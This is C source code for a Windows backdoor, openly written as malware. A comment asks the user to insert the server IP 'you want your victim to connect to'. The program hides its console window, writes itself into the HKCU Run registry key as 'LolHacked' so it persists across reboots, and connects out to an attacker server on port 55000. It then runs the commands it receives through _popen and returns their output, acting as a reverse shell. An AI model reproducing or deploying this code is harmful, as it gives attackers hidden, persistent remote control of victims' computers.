#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include<WinSock2.h>
#include<winsock.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p), 0, (size)) // Zeros all bytes in a specified memory region

int sock;

// Function to set the backdoor as auto run on boot. 
int setBootRun(){

    char *returnError = "Errore while setting boot run.";

    TCHAR programPath[MAX_PATH];
    DWORD pathLenght = 0;

    HKEY hkey;

    DWORD lenght = GetModuleFileName(NULL, programPath, sizeof(programPath));
    if(lenght == 0){
        send(sock, returnError, sizeof(returnError), 0);
        return -1;
    }

    // Opening registry, and close the function if failed
    if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey) != 0L){
        send(sock, returnError, sizeof(returnError), 0);
        return -1;
    }

    // If the program hasn't failed, the registry of windows is correctly open. 
    DWORD bytesPathLenght = pathLenght;
    if(RegSetValueEx(hkey, "LolHacked", 0, REG_SZ, (LPBYTE)programPath, (DWORD)strlen(programPath) +1) != 0L){
        send(sock, returnError, sizeof(returnError), 0);
        return -1;
    }

    // If the function hasn't returned, the key has been successfully setted.

    RegCloseKey(hkey);
    char *successMsg = "RegKey for auto-run at boot has been added at: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.";
    send(sock, successMsg, sizeof(successMsg), 0);
    return 0;

}

void RemoteShell(){
    
    char buffer[1024]; // Buffer for the input commands from the server
    char container[1024]; // Check if commands are greater than 1024

    // Concatenate commands if greater than 1024
    char totalResponse[18834];

    while(1){
        label:

        // Setting to zero all bytes of the three buffers created
        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(totalResponse, sizeof(totalResponse));

        // Waiting for the command in input from the server
        recv(sock, buffer, sizeof(buffer), 0);

        if(strcmp("q", buffer) == 0){
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if(strcmp("setbootrun", buffer) == 0){
            setBootRun();
        }
        else{
            FILE *fp;

            // Creates a pipe that executes commands and then returns the response.
            fp = _popen(buffer, "r");

            // Concatenate if the buffer is bigger than 1024
            while(fgets(container, sizeof(container), fp) != NULL){
                strcat(totalResponse, container);
            }

            send(sock, totalResponse, sizeof(totalResponse), 0);
            fclose(fp);
        }

    }

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd){

    // Insert here the IP of your server you want your victim to connect to
    char *ServIP = "";


    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    
    ShowWindow(stealth, 0);

    setBootRun();

    // Creating socket for connecting to backdoor
    struct sockaddr_in ServerAddress;

    WSADATA wsaData;

    if(WSAStartup(MAKEWORD(2, 0), &wsaData) != 0){
        printf("Error starting WinSock.");
        exit(1);
    }

    // Defining the object
    sock = socket(AF_INET, SOCK_STREAM, 0);
    memset(&ServerAddress,0,sizeof(ServerAddress));

    // These are the credentials used to access the server backdoor
    ServerAddress.sin_family = AF_INET;
    ServerAddress.sin_addr.s_addr = inet_addr(ServIP);

    // Port in which you desire to connect
    ServerAddress.sin_port = htons(55000);

    // Trying to connnect to the backdoor server with the loop
    while (connect(sock, (struct sockaddr*)&ServerAddress,sizeof(ServerAddress)) != 0){
        Sleep(5);
    }

    RemoteShell();

    return 0;

}